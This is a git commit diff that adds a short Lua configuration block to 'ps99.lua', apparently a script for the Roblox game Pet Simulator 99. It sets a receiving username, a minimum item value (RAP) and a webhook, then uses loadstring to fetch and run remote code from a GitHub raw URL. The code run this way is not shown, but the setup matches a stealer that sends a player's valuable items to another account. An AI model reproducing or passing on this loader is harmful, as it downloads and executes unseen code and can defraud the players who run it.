d502d541bbc2cb8094a831ec16205182d0b02e1a
lemonzscripts <yeeteshsyba+1@gmail.com>
2025-03-09 14:27:02 +0800

    Update ps99.lua

--- ps99.lua
+++ ps99.lua
@@ -1,1 +1,6 @@
+Username = "UsernameHere"
+Username2 = "SameUsername"
+MinimumRAP = 1000000
+Webhook = "WebhookHere"
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lemonzscripts/Lemons/refs/heads/main/Scripts/PS99.lua", true))() 
